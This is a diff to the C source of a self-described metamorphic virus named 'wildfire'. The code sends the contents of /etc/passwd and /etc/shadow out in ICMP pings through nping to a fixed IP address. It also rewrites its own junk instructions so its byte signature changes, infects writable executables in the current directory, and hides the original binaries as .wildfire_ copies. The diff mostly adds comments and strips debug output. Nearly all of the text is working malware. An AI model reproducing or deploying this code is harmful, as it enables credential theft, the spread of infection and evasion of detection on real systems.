@@ -4,8 +4,6 @@
 #include <ctype.h>
 #include <time.h>
 #include <dirent.h>
-#include <unistd.h>
-#include <sys/stat.h>
 #include <errno.h>
 
 #define PUSH 0x50
@@ -25,62 +23,75 @@ const unsigned char prefixes[] = { ADD, AND, XOR, OR, SBB, SUB, 0 };
 #define JUNK asm __volatile__(".byte 0x50, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x58\n");
 #define JUNKLEN 8
 
+/* Binary code of the current executable */
 unsigned char *code;
+/* Length of the binary code */
 int codelen;
+/* Name of the original executable */
 unsigned char *original_executable;
+/* Flag to check if malware's first run */
 int first_run = 1;
 
+/* Reads binary code from file */
 void read_code(const char *file_name)
 {
-    /* Opens file, rb represents read and binary */
+    // Opens file in read binary mode
     FILE *fp = fopen(file_name, "rb");   JUNK;
-    /* Sets the file position of the stream to the given offset (0 long int) */
-    fseek(fp, 0L, SEEK_END);            JUNK;
-    /* Sets the length of the code  */
+    // Sets the file position of the stream to the given offset (0 long int)
+    fseek(fp, 0L, SEEK_END);             JUNK;
+    // Sets the length of the code in bytes
     codelen = ftell(fp);
-    /* Allocates memory to the length of the code */
-    code = malloc(codelen);             JUNK;
-    /* Gets the file position of the stream to the start of the file */
+    // Allocates memory to the length of the code
+    code = malloc(codelen);              JUNK;
+    // Sets the file position of the stream to the start of the file
     fseek(fp, 0L, SEEK_SET);
-    /* Reads the file into the code variable in memory */
-    fread(code, codelen, 1, fp);        JUNK;
-}
-
-void write_code(const char *file_name)
-{
-    FILE *fp;
-    /* Opens file with write to binary permissions */
-    fp = fopen(file_name, "wb");          JUNK;
-    /* Writes the code variable into the file */
-    fwrite(code, codelen, 1, fp);           JUNK;
+    // Reads the file into the code variable in memory
+    fread(code, codelen, 1, fp);         JUNK;
+    // Closes the file
     fclose(fp);
 }
 
+/* Writes binary code to file */
+void write_code(const char *file_name)
+{
+    // Opens file with binary write permissions
+    FILE *fp = fopen(file_name, "wb");          JUNK;
+    // Writes the code variable to file
+    fwrite(code, codelen, 1, fp);               JUNK;
+    // Closes the file
+    fclose(fp);
+}
+
+/* Write assembly instruction */
 int write_instruction(unsigned reg, int offset, int space)
 {
+    // Write instruction based on the amount of space available
     if (space < 2)
     {
-        code[offset] = NOP;                     JUNK;
+        code[offset] = NOP;                         JUNK;
         return 1;
     }
     else if (space < 5 || rand()%2 == 0)
     {
-        code[offset] = prefixes[rand()%6];      JUNK;
-        code[offset+1] = 0xC0 + rand()%8*8 + reg; JUNK;
+        code[offset] = prefixes[rand()%6];          JUNK;
+        code[offset+1] = 0xC0 + rand()%8*8 + reg;   JUNK;
         return 2;
     }
     else
     {
-        code[offset] = MOV+reg;                 JUNK;
+        code[offset] = MOV+reg;                     JUNK;
         *(short*)(code+offset+1) = rand();
-        *(short*)(code+offset+3) = rand();      JUNK;
+        *(short*)(code+offset+3) = rand();          JUNK;
         return 5;
     }
 }
 
+/* Read assembly instruction */
 int read_instruction(unsigned reg, int offset)
 {
+    // Read first instruction at offset
     unsigned c1 = code[offset];
+    // Return the amount of space used for instruction
     if (c1 == NOP)
     {
         return 1;                       JUNK;
@@ -91,6 +102,7 @@ int read_instruction(unsigned reg, int offset)
     }
     if (strchr(prefixes, c1))
     {
+        // Read second instruction at offset
         unsigned c2 = code[offset+1];   JUNK;
         if (c2 >= 0xC0 && c2 <= 0xFF && (c2&7) == reg)
         {
@@ -100,6 +112,7 @@ int read_instruction(unsigned reg, int offset)
     }
 }
 
+/* Metamorphic replacement of junk */
 void replace_junk(void)
 {
     int i, j, inc, space;
@@ -114,7 +127,7 @@ void replace_junk(void)
         if (start < PUSH || start >= PUSH+8) continue;  JUNK;
         if (end != POP+reg) continue;                   JUNK;
 
-        /* Register 4 is ESP (stack) */
+        // Register 4 is ESP (stack)
         if (reg == 4) continue;
 
         j = 0;                                          JUNK;
@@ -130,7 +143,7 @@ void replace_junk(void)
         j = 0;                                          JUNK;
         while (space)
         {
-            inc = write_instruction(reg, i+1+j, space);  JUNK;
+            inc = write_instruction(reg, i+1+j, space); JUNK;
             j += inc;
             space -= inc;                               JUNK;
         }
@@ -138,71 +151,63 @@ void replace_junk(void)
     }
 }
 
+/* Reads a standard file */
 char* read_file(const char *file_name)
 {
     unsigned char *str;
     int strlen;
-    /* Opens file, rb represents read and binary */
+
+    // Opens file in read mode
     FILE *fp = fopen(file_name, "r");   JUNK;
-    /* Sets the file position of the stream to the given offset (0 long int) */
+    // Sets the file position of the stream to the given offset (0 long int)
     fseek(fp, 0L, SEEK_END);            JUNK;
-    /* Sets the length of the code  */
+    // Sets the length of the code
     strlen = ftell(fp);
-    /* Allocates memory to the length of the code */
-    str = malloc(strlen);             JUNK;
-    /* Gets the file position of the stream to the start of the file */
+    // Allocates memory to the length of the code
+    str = malloc(strlen);               JUNK;
+    // Gets the file position of the stream to the start of the file
     fseek(fp, 0L, SEEK_SET);
-    /* Reads the file into the code variable in memory */
-    fread(str, strlen, 1, fp);        JUNK;
-
-
-    // TODO: close file
+    // Reads the file into the code variable in memory
+    fread(str, strlen, 1, fp);          JUNK;
+    // Closes the file
+    fclose(fp);
 
     return str;
-}
-
-void send_ping(const char *cmd)
-{
-    system(cmd);
 }
 
 // Send /etc/passwd and /etc/shadow files in a ping
 void execute()
 {
-    unsigned char *passwd;
+    unsigned char *passwd;                  JUNK;
     unsigned char *shadow;
-    int passwd_len;
+    int passwd_len;                         JUNK;
     int shadow_len;
 
     passwd = read_file("/etc/passwd");
-    shadow = read_file("/etc/shadow");
+    shadow = read_file("/etc/shadow");      JUNK;
 
     passwd_len = strlen(passwd);
-    shadow_len = strlen(shadow);
+    shadow_len = strlen(shadow);            JUNK;
 
     char *ping = "sudo nping -c 1 --icmp --data-string \"%s\" 192.168.1.142";
-    int ping_len = strlen(ping);
+    int ping_len = strlen(ping);            JUNK;
 
     int passwd_cmd_len = ping_len + passwd_len + 1;
     int shadow_cmd_len = ping_len + shadow_len + 1;
 
-    char passwd_cmd[passwd_cmd_len];
-    char shadow_cmd[shadow_cmd_len];
+    char passwd_cmd[passwd_cmd_len];        JUNK;
+    char shadow_cmd[shadow_cmd_len];        JUNK;
 
     sprintf(passwd_cmd, ping, passwd);
-    sprintf(shadow_cmd, ping, shadow);
+    sprintf(shadow_cmd, ping, shadow);      JUNK;
 
-    printf(passwd_cmd);
-    printf(shadow_cmd);
-
-    send_ping(passwd_cmd);
-    send_ping(shadow_cmd);
+    system(passwd_cmd);
+    system(shadow_cmd);                     JUNK;
 }
 
-void copy_and_hide_file(const char *filename)
+/* Executes a bash command to execute and hide an original executable file */
+void copy_and_hide_file(const char *bash_code, const char *filename)
 {
-    char *bash_code = "cp %s .wildfire_%s";
-
     int cmd_len = strlen(bash_code) + strlen(filename) + 1;
     char cmd[cmd_len];
 
@@ -222,9 +227,10 @@ void execute_bash(const char *bash_code, const char *file_name)
     system(cmd);
 }
 
+/* Embeds the malware in the executable and hides a copy of the original executable */
 void embed_code(const char *file_name)
 {
-    copy_and_hide_file(file_name);
+    copy_and_hide_file("cp %s .wildfire_%s", file_name);
     execute_bash("chmod +x %s", file_name);
 
     write_code(file_name); JUNK;
@@ -235,74 +241,75 @@ void propagate(const char *path, const char *exclude) {
 DIR *dir;
     struct dirent *ent;
 
-    /* Open directory stream */
+    // Open directory stream
     dir = opendir ("./");
     if (dir != NULL) {
-
-        /* Print all files and directories within the directory */
+        // Iterate over all files in the current directory
         while ((ent = readdir (dir)) != NULL) {
-            // regular files only - no DT_DIR (directories) or DT_LNK (links)
+            // Select regular files only, not DT_DIR (directories) nor DT_LNK (links)
             if (ent->d_type == DT_REG)
             {
+                // Select executable and writable files that can be infected
                 if (access(ent->d_name, X_OK) == 0 && access(ent->d_name, W_OK) == 0)
                 {
+                    // Ignore the executable that is running the program
                     if (strstr(exclude, ent->d_name) != NULL)
                     {
-                        printf("Self executable is ignored: %s\n", ent->d_name);
                         original_executable = ent->d_name;
                     }
+                    // Ignore hidden executables with wildfire label
                     else if (strstr(ent->d_name, "wildfire") != NULL)
                     {
-                        printf("Wildfire executable is ignored: %s\n", ent->d_name);
                         first_run = 0;
                     }
                     else
                     {
-                        // Skip if executable has already been infected
+                        // Ignore executables that have already been infected
                         const char *bash_code = ".wildfire_%s";
                         int hidden_file_len = strlen(bash_code) + strlen(ent->d_name) + 1;
                         char hidden_file[hidden_file_len];
-
                         sprintf(hidden_file, bash_code, ent->d_name);
 
+                        // 
                         if( access(hidden_file, F_OK) == -1 ) {
                             embed_code(ent->d_name);
-                            printf("Propagated into: %s\n", ent->d_name);
-                        } else {
-                            printf("Skipping %s executable because hidden file already exists\n", ent->d_name);
                         }
                     }
-                    
                 }
-                printf("\n");
             }
         }
 
         closedir (dir);
 
     } else {
-        /* Could not open directory */
+        // Error if directory fails to open
         fprintf (stderr, "Cannot open %s (%s)\n", "./", strerror (errno));
         exit (EXIT_FAILURE);
     }
 }
 
-// Should check before executing if root privilege
+/* Main function of metamorphic virus */
 int main(int argc, char* argv[])
 {
     printf("EXE FILE: %s\n", argv[0]);
-    system("id -u"); // outputs 0 if root user
-    execute("192.168.1.142"); // send ICMP ping with custom payload to IP
+    // Outputs 0 if executable is running with root privileges
+    system("id -u");
+    // Sends ICMP ping with custom payload to IP
+    execute("192.168.1.142");
+    // Reads code into memory from currently running executable
     read_code(argv[0]);  JUNK;
-    //printf("%s:%d", code, codelen);
+    // Metamorphically changes the code in a random fashion
     replace_junk();      JUNK;
-    propagate("./", argv[0]); // list writable executable files for propagation
-    // Add first run edge case to prevent infinite loop if raw virus file is present in directory
+    // Propagates the malware into other executables in the same directory
+    propagate("./", argv[0]);
+    // Edge case to prevent an infinite loop during the malware's first execution
     if (first_run == 1)
     {
         execute_bash("touch .wildfire_%s", original_executable);
         execute_bash("chmod +x .wildfire_%s", original_executable);
     }
+    // Execute the original, hidden executable
     execute_bash("./.wildfire_%s", original_executable);
+
     return 0;
 }
